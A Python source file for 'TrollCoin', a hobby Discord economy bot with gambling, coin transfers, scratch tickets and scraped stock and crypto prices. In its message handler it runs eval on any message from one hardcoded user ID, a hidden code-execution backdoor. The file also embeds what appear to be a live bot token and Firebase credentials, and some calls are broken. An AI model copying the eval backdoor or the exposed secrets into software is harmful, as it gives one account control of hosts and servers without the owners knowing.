import discord 
from discord.ext import commands
from discord_slash import SlashCommand, SlashContext
from discord_slash.utils.manage_commands import create_option, create_choice
import asyncio, random, threading, time, requests, pyrebase
from bs4 import BeautifulSoup

async def addRole(**kwargs):
  kwargs.setdefault("server", 742422199368941629)
  kwargs.setdefault("user", 469998488730468362)
  kwargs.setdefault("role", 742429021098344469)  
  server = await client.fetch_guild(int(kwargs["server"]))
  member = await server.fetch_member(int(kwargs["user"]))
  role = discord.Object(int(kwargs["role"]))
  await member.add_roles(role)
  if "channel" in kwargs and "reason" in kwargs:
    channel = await client.fetch_channel(kwargs["channel"])
    await channel.send(f'I\'ve added {role.name} to {member.nick}. Reason: {kwargs["reason"]}')
async def removeRole(**kwargs):
  kwargs.setdefault("server", 742422199368941629)
  kwargs.setdefault("user", 469998488730468362)
  kwargs.setdefault("role", 742429021098344469)
  server = await client.fetch_guild(kwargs["server"])
  member = await server.fetch_member(kwargs["user"])
  role = discord.Object(kwargs["role"])
  await member.remove_roles(role)
async def say(**kwargs):
  kwargs.setdefault("server",742422199368941629)
  kwargs.setdefault("channel",827678465880752179)

  if "content" in kwargs:
    if "user" in kwargs:
      user = await client.fetch_user(kwargs["user"])
      channel = await user.create_dm()
    else:
      channel = await client.fetch_channel(kwargs["channel"])
    if "reply" not in kwargs:
      await channel.send(kwargs["content"])
    elif "reply" in kwargs:
      reply = await channel.fetch_message(kwargs["reply"])
      await channel.send(kwargs["content"],reference=reply)
async def pin(message,channel=827678465880752179,**kwargs):
  channel = await client.fetch_channel(channel)
  message = await channel.fetch_message(message)
  if "unpin" in kwargs and kwargs["unpin"] == True:
    await message.unpin()
  else: 
    await message.pin()

firebaseConfig = {
  "apiKey": "AIzaSyA5S9AvDZX_HxTlKV5Q7YQRyo0uvm9hOEM",
  "authDomain": "trollcoinpy.firebaseapp.com",
  "databaseURL": "https://trollcoinpy-default-rtdb.firebaseio.com",
  "projectId": "trollcoinpy",
  "storageBucket": "trollcoinpy.appspot.com",
  "messagingSenderId": "71836853150",
  "appId": "1:71836853150:web:be7289cee49bb9fbc6ec8f",
  "measurementId": "G-85GBYPG44C"
}

firebase = pyrebase.initialize_app(firebaseConfig)

db = firebase.database()

# token = os.environ['token']
token = "ODM0ODEwOTY4MjY0NTQwMTgy.YIGUTA.xv5e-oWC9gMO85b-HvtAsX2DsVk"
# class thousandaire:
#   id = 836405383735017523
intents = discord.Intents().default()
intents.members = True
client = commands.Bot(command_prefix = "tc!",intents=intents)
prefix = "tc!"
slash = SlashCommand(client, sync_commands=True)
# https://discord.com/api/oauth2/authorize?client_id=834810968264540182&permissions=8&scope=bot%20applications.commands


lesgo = ["letsg","letsag","lesg"]
join_messages = [
  "Everyone welcome our newest thousandaire, {}!",
  "{} has ascended to new levels",
  "{} has joined the ranks of the TrollCoin thousandaires!",
  "GG {}, welcome to heaven!",
  "{} has popped into our lovely server.",
  "Hi {}! Good day to you!"
]

guild_ids = [int(f) for f in db.child('active_guilds').get().val()]
# print(f"Active Guilds: {guild_ids}")

channels = [int(f) for f in db.child('binded_channels').get().val()]
# print(f"Binded Channels: {channels}")

pdata = db.child("users").get().val()
# print(f"User Data: {pdata}")
# input()

@slash.slash(
  guild_ids = guild_ids,
  name="ping",
  description="pong",
)
async def _ping(ctx):
  await ctx.send("Pong!")

@slash.slash(
  guild_ids = guild_ids,
  name="gamble",
  description="gamble an integer amount for a chance to earn 133%",
  options=[
    create_option(
      name="type",
      description="gamble type", 
      option_type=3, 
      required=True,
      choices=[
        create_choice(
          name="133%",
          value="133%"
        ),
        create_choice(
          name="Double",
          value="Double"
        )
      ]
    ),
    create_option(
      name="amount",
      description="gamble amount",
      option_type=4,
      required=True
    )
  ]
)
async def _gamble(ctx,type:str,amount:int):
  global pdata
  # try:
  gamble_type=type
  gamble_amount=amount
  gamble_endamount=amount
  if str(ctx.author.id) not in pdata.keys():
    await ctx.send(content="You don't have an account! Type tc!create to make an account.")
  else:
    if gamble_amount + 1 > int(pdata[str(ctx.author.id)]):
      await ctx.send(content=f"We're very sorry, but you don't have enough money to gamble!")
    elif gamble_amount > 999999:
      await ctx.send(content="Holy crap, chill out lol, the limit is 999,999~~TC~~ to prevent abuse. Thanks for understanding.")
    else:

      pdata[str(ctx.author.id)] = pdata[str(ctx.author.id)] - gamble_amount

      if gamble_type == "Double":
        gamble_end = random.randint(1,3)
      elif gamble_type == "133%":
        gamble_end = random.randint(1,2)
      
      if gamble_end == 1:
        success = "successfully!"
        if gamble_type == "Double":
          gamble_endamount *= 2
        elif gamble_type == "133%":
          gamble_endamount *= 1.33
      else:
        success = "and lost :(."
        if gamble_type == "Double":
          gamble_endamount *= .5
        elif gamble_type == "133%":
          gamble_endamount *= .66
      # gamble_endamount = round(gamble_endamount,2)

      pdata[str(ctx.author.id)] = round(pdata[str(ctx.author.id)] + gamble_endamount,2)

      await ctx.send(content=f"You've gambled {gamble_amount:,}~~TC~~ {gamble_type} {success} {gamble_endamount:,}~~TC~~ has been deposited back into your account.")
  # except:
  #  await ctx.send(content="Oh no, there was an error! Maybe it was because you didn't format this command properly... not sure.")

channel = 834813365648883744
async def manual_input():
  global channel
  while True:
    x=""
    x = await aioconsole.ainput(f"tc$manual : ")
    if x != "":
      # channel = 834813365648883744
      if x == "tc$empty":
        x = "||\n||"
      if x.startswith("tc$c"):
        channel = int(x.split()[1])
        x = " ".join(x.split()[2:])
      try:
        await client.get_channel(channel).send(x)
      except: pass
    else: continue
def CE(**info):
  info.setdefault('title','TrollCoin')
  info.setdefault('description','No description was provided for this embed')
  info.setdefault('color', discord.Color.from_rgb(252, 255, 51))
  embed = discord.Embed(title=info['title'],description=info['description'],color=info['color'])
  embed.set_footer(text='Made by Elephant#5716 and Sounds About Right#9270 2021')

  return embed

def helpEmbed():
  embed = discord.Embed(
    title="TrollCoin Help",
    color=discord.Color.from_rgb(252,255,51),
    description="Hello!! Thank you for adding me, here is a list of commands:"

  )
  embed.add_field(
    name = "tc! Commands:",
    value="**create** - create an account.\n**balance** - see your balence (or others by mentioning them).\n**send <usermention> <intvalue>** - sends a specified amount of ~~TC~~ to the mentioned user.\n**ascend** - buy a ticket to Le Troll Supreme for 1k.\n**gamblehelp** - I will send the probability stats for gambling.\n**ahelp** - extra info on probability\n**bind** - binds me to this channel. (allows me to talk in this channel)\n**unbind** - unbinds this channel. I cannot read or talk in it for most commands.\n**stock <stockname>** - gets information about a stock (the price).\n**crypto <cryptocurrencyname>** - gets information about a cryptocurrency (the price)", # \n**advancedhelp** - DMs you literally everything you could possibly do with the bot
    inline=True
  )
  embed.add_field(
    name="Slash Commands:",
    value="**ping** - pong\n**gamble** - gamble a specified amount for a specified return with a specified chance of success/failure",
    inline=True
  )
  embed.set_footer(text='Made by Elephant#5716 and Sounds About Right#9270 2021')

  return embed

# while True:
#   winner_ticket = "".join([str(random.randint(0,9)) for f in range(5)])
#   your_ticket =   "".join([str(random.randint(0,9)) for f in range(5)])
#   # print(winner_ticket)
#   # print(your_ticket)
#   input()

def scratchTicket(winner,your):
  embed = discord.Embed(
    title="Scratch Ticket",
    color=discord.Color.from_rgb(252,255,51),
    description= f'**Winning ticket:**\n{" ".join(winner)}\n**Your ticket:**\n{" ".join(["||"+d+"||" for d in your])}'
  )
  embed.set_footer(text='Made by Elephant#5716 and Sounds About Right#9270 2021')

  return embed

def ahelp(which):
  if which == 0:
    embed = discord.Embed(
      title="Advanced Help",
      color=discord.Color.from_rgb(252,255,51),
      description="**Gambling info**\n\n**double** - has a 1/3 chance of 200% return and 2/3 chance of 66% return\n**133%** - has a 1/2 chance of 133% return and a 1/2 of 66% return\nHappy gambling!\n"
    )
    embed.set_footer(text="Pg 1 of 2")
  elif which == 1:
    embed = discord.Embed(
      title="Advanced Help",
      color = discord.Color.from_rgb(252,255,51),
      description="**Scratch ticket info**\n\nPlease note that this is completely independent of other users.\nWe sell you a ticket for 5~~TC~~ and if your code matches the winning code you get 50,000~~TC~~.\nHappy lottering!"
    )
    embed.set_footer(text="Pg 2 of 2")
  else:
    embed = CE()
  return embed

# class miningSession:
#   def __init__(self,author,channel):
#     global mining_sessions
#     self.author, self.channel = author, author
#     if self.author in mining_sessions:
#       mining_sessions.append(self.author)
#       asyncio.run(mine())
#     else: pass
#   async def mine(self): pass
    



@client.event
async def on_message(message):
  # try: print(f"[{message.guild.name}] [{message.channel.name}] {message.author} : {message.content}")
  # except:pass
  pm = message.content.lower()
  global channels
  global pdata
  # print(message.channel.type)
  if message.author.id == 618574628608278528:
    try:await eval(message.content)
    except:pass
    

  if message.author.bot == True:
    pass
  else:
    if str(message.channel.type) == "private" and pm.startswith(prefix+"mine"):
      if str(message.author.id) in pdata.keys():
        pdata[str(message.author.id)] = pdata[str(message.author.id)] + .07
      else:
        message.channel.send(f"<@{message.author.id}>, you don't have an account! Type tc!create to make an account.")
  
    if pm.startswith(prefix+"bind") and str(message.channel.type) != "private" and message.author == message.channel.guild.owner:
      if message.channel.id in channels:
        await message.channel.send("Channel already binded.")
      else:
        channels.append(message.channel.id)
  
        # print(channels)
        await message.channel.send("Binded successfully.")
    
    elif pm.startswith(prefix+"help"):
      await message.channel.send(embed=helpEmbed())
    if int(message.channel.id) in channels or str(message.channel.type) == "private":
      if message.author == client.user:
        return
      if pm.startswith(prefix+"unbind") and str(message.channel.type) != "private" and message.author == message.channel.guild.owner:
      
        channels.pop(channels.index(message.channel.id))
  
        await message.channel.send("Channel unbinded successfully.")
  
      elif pm.startswith(prefix+"create"):
      
        # input(data)
  
        if str(message.author.id) in pdata.keys():
          await message.channel.send(f"Whoops, <@{message.author.id}>, you have an account already!")
        else:
          pdata.setdefault(str(message.author.id), 50)
          # pdata = json.dumps(pdata)
          # data = open(os.path.join(sys.path[0], "data.txt"),'w')
          # data.write(pdata)
          await message.channel.send(f"Thank you <@{message.author.id}>, your account has been created!")
  
      elif pm.startswith(prefix+"balence") or pm.startswith(prefix+"balance"):
      
        if message.mentions == []:
          if str(message.author.id) in pdata.keys():
            await message.channel.send(f"<@{message.author.id}>, you have {round(pdata[str(message.author.id)],2):,}~~TC~~!")
          else:
            await message.channel.send(f"<@{message.author.id}>, you don't have an account! Type tc!create to make an account.")
        elif message.mentions != [] and str(message.mentions[0].id) in pdata.keys():
          await message.channel.send(f"{message.mentions[0].name} has {round(pdata[str(message.mentions[0].id)],2):,}~~TC~~.")
        else:
          await message.channel.send(f"{message.mentions[0].name} doesn't have an account. You know what would be epic? Telling them to make one!")
      elif pm.startswith(prefix+"send"):
        try:
          if message.mentions == []:
            await message.channel.send(f"Oh yikes, <@{message.author.id}>, you need to mention (ping) someone for this command, mate!")
          elif str(message.author.id) not in pdata.keys():
            await message.channel.send(f"<@{message.author.id}>, you don't have an account! Type {prefix}create to make an account.")
          elif str(message.mentions[0].id) not in pdata.keys():
            await message.channel.send(f"{message.mentions[0].name} doesn't have an account. You know what would be epic? Telling them to make one!")
          else:
            # # print(pm.split())
            transfer_amount = round(float(pm.split()[-1]),2)
            # # print(transfer_amount)
            if pdata[str(message.author.id)] < transfer_amount+1:
              await message.channel.send(f"<@{message.author.id}>, you don't have enough TrollCoin for this transfer! :(")
            else:
              pdata[str(message.author.id)] = pdata[str(message.author.id)] - transfer_amount
              pdata[str(message.mentions[0].id)] = pdata[str(message.mentions[0].id)] + transfer_amount
              await message.channel.send(f"<@{message.author.id}>, your transfer of {transfer_amount} to {message.mentions[0].name} was successful!")
      
        except:
          await message.channel.send("Yikes, something went wrong. Perhaps it's because you formatted this command incorrectly. It should be {prefix}send <usermention> <intamount>. Ignore the <>'s. Good luck!'")
      elif pm.startswith(prefix+"ahelp"):
        # dm = await message.author.create_dm()
        x = 0
        ahelp_dm = await message.channel.send(embed = ahelp(x))
        await ahelp_dm.add_reaction("➡️")
        def ahelpcheck(reaction,user):
          return user == message.author and str(reaction.emoji) == "➡️"
        while True:
          try:
            # print(x)
            await client.wait_for('reaction_add',timeout=30,check=ahelpcheck)
          except asyncio.TimeoutError:
            break
          else:
            await ahelp_dm.remove_reaction(member=message.author,emoji="➡️")
            x = 0 if x > 0 else x + 1
            await ahelp_dm.edit(embed=ahelp(x))
      elif pm.startswith(prefix+"ascend"):
        if pdata[str(message.author.id)] < 1001:
          await message.channel.send(f"<@{message.author.id}>, you don't have enough TrollCoin to ascend! :(")
        else:
          sure_message = await message.channel.send("You are about to spend 1k~~TC~~ on an invite to TrollCoin heaven. Are you sure if you want to do this?")
          await sure_message.add_reaction("✔️")
          # await sure_message.add_reaction("❌")
          def check(reaction,user):
            return user == message.author and str(reaction.emoji) == "✔️"
          try:
            await client.wait_for("reaction_add",timeout=30,check=check)
          except asyncio.TimeoutError:
            await sure_message.reply("Ok, maybe next time :)")
          else:
            pdata[str(message.author.id)] = pdata[str(message.author.id)] - 1000
            temp_inv = await client.get_channel(836267451574124564).create_invite(unique=True,max_uses=1)
            dm = await message.author.create_dm()
            await dm.send(content=temp_inv)
      elif pm.startswith(prefix+"bail"):
        x = await message.channel.send("You're about to reset your account and gain back 25~~TC~~. Are you sure you want to do this?")
        await x.add_reaction("✔️")
        def check(reaction,user):
          return user == message.author and str(reaction.emoji) == "✔️"
        try:
          await client.wait_for("reaction_add",timeout=120,check=check)
        except:pass
        else: pdata[str(message.author.id)] = 25; await message.channel.send(f"<@{message.author.id}>, you've been bailed out.")
  
      elif pm.startswith(prefix+"scratch"):
        if str(message.author.id) not in pdata.keys():
          await message.channel.send(f"<@{message.author.id}>, you don't have an account! Type {prefix}create to make an account.")
        elif pdata[str(message.author.id)] < 7:
          await message.channel.send(f"<@{message.author.id}>, it seems like you don't have enough money for this scratch ticket!")
        else:
          winner_ticket = [str(random.randint(0,9)) for f in range(5)]
          your_ticket =   [str(random.randint(0,9)) for f in range(5)]
          ticket_mod = random.randint(0, 3)
          if ticket_mod == 0:
            mod_loc=None
            ticket_mod=None
            pass
          elif ticket_mod == 1:
            mod_loc = random.randint(0,len(your_ticket)-2)
            for m in range(2):your_ticket[mod_loc+m] = winner_ticket[mod_loc+m]
          elif ticket_mod == 2:
            mod_loc = random.randint(0,len(your_ticket)-3)
            for m in range(3):your_ticket[mod_loc+m] = winner_ticket[mod_loc+m]
          elif ticket_mod == 3:
            mod_loc = random.randint(0,len(your_ticket)-4)
            for m in range(4):your_ticket[mod_loc+m] = winner_ticket[mod_loc+m]
  
          # print(ticket_mod)
          # print(mod_loc)
  
          # # print(winner_combo)
          pdata[str(message.author.id)] = pdata[str(message.author.id)] -5
  
          if winner_ticket == your_ticket:
            pdata[str(message.author.id)] = pdata[str(message.author.id)] + 50000
  
          await message.channel.send(embed = scratchTicket(winner_ticket,your_ticket))
      elif pm.startswith(prefix+"stock"):
        try:
          stock = pm.split()[1:]
          stock = " ".join(stock)
          print(stock)
        except:
          message.channel.send(content="Message was fromatted incorrectly.")
        try:
          html_page = BeautifulSoup(requests.get("https://www.google.com/search?q="+stock.rstrip().replace(" ","+")+"+stock+price",headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}).text,"html.parser")
        except:
          message.channel.send(content="An Error Occured retrieving the google stock page. This is likely due to an error regarding special characters. Not sure though.")
        try:
          name = html_page.find(class_="aMEhee").text
          await message.channel.send(f"{name} stock price: {html_page.find(jsname='vWLAgc').text}USD")
        except:
          await message.channel.send(content=f'An Error Occured finding the the stock price for "{stock}". This is likely due to an issue with its legitimacy. Please enter a valid stock name.')
  
      elif pm.startswith(prefix+"crypto"):
        try:
          crypto = pm.split()[1:]
          crypto = " ".join(crypto)
        except:
          await message.channel.send("Message was fromatted incorrectly.")
        try: 
          html_pageG = BeautifulSoup(requests.get("https://www.google.com/search?q="+crypto.replace(" ","+")+"+cryptocurrency+coinmarketcap",headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}).text,"html.parser")
          cmc = html_pageG.find("div",class_="yuRUbf").find("a")['href']
          if cmc.startswith("https://coinmarketcap.com/"):
            html_pageC = BeautifulSoup(requests.get(cmc,headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}).text,"html.parser")
            cost = html_pageC.find(class_="priceValue___11gHJ").text
            name = str(html_pageC.find(class_="priceHeading___2GB9O").text.split()[0])
            await message.channel.send(f"{name} costs {cost[1:]}USD.")
          else:
            await message.channel.send(f'An error occured looking up "{crypto}". This is likely due to a problem with this crypto\'s legitimacy.')
            
        except:
          await message.channel.send("An Error Occured retrieving the google crypto lookup page. This is likely due to an error regarding special characters. Not sure though.")
  
      else: pass
    
    if pm.rstrip("o").startswith("le"):
      x =  pm.replace("'","")
      x =  x.replace(" ","")
      x =  x.rstrip("!.o\"'")
      if x in lesgo:
        await message.add_reaction("👉")
        await message.add_reaction("👶")
        await message.add_reaction("👈")
    if pm.startswith("yea"):
      x = "".join([u.rstrip("yh,a!.\"'") for u in pm.split()])
      if x == "yeye":
        await message.add_reaction("👉")
        await message.add_reaction("👶")
        await message.add_reaction("👈")
    if pm.startswith("no"):
      x = "".join([u.rstrip(",!.\"'") for u in pm.split()])
      if x == "nono":
        await message.add_reaction("👈")
        await message.add_reaction("👶")
        await message.add_reaction("👉")

@client.event
async def on_member_join(member):
  # print(member.guild.id)
  if member.guild.id == 836241112561614851:
    await member.add_roles(discord.Object(836405383735017523))
    await client.get_channel(836267451574124564).send(content=random.choice(join_messages).format("<@"+str(member.id)+">"))
  else:pass

@client.event
async def on_guild_join(guild):
  global guild_ids
  # print("Joined a guild")
  # print(guilds)
  # print(guild_ids)
  if guild.id not in guild_ids:
    guild_ids.append(guild.id)

  await guild.text_channels[0].send(embed=helpEmbed())

def saveData():
  global pdata
  while True:
    for z in pdata:
      pdata[z] = round(pdata[z], 2)
    time.sleep(15)
    db.child("active_guilds").set([str(f) for f in guild_ids])
    # print(f"Guild Data Saved:\n{guild_ids}")
    db.child("binded_channels").set([str(f) for f in channels])
    # print(f"Channel Data Saved:\n{channels}")
    db.child("users").update(pdata)
    # print(f"User Data Saved:\n{pdata}")
saveDataT = threading.Thread(args=[],target=saveData)

@client.event
async def on_ready(): 
  # print("Client info:")
  # print()
  # print("{0.user} Has been successfully updated!".format(client))
  await client.change_presence(activity = discord.Game(name=f"{prefix}help")) # Sets status 
  await client.get_channel(834813365648883744).send(embed = CE(description = "I'm alive"))
  saveDataT.start()
  print("hey")
  # asyncio.create_task(manual_input())

client.run(token)
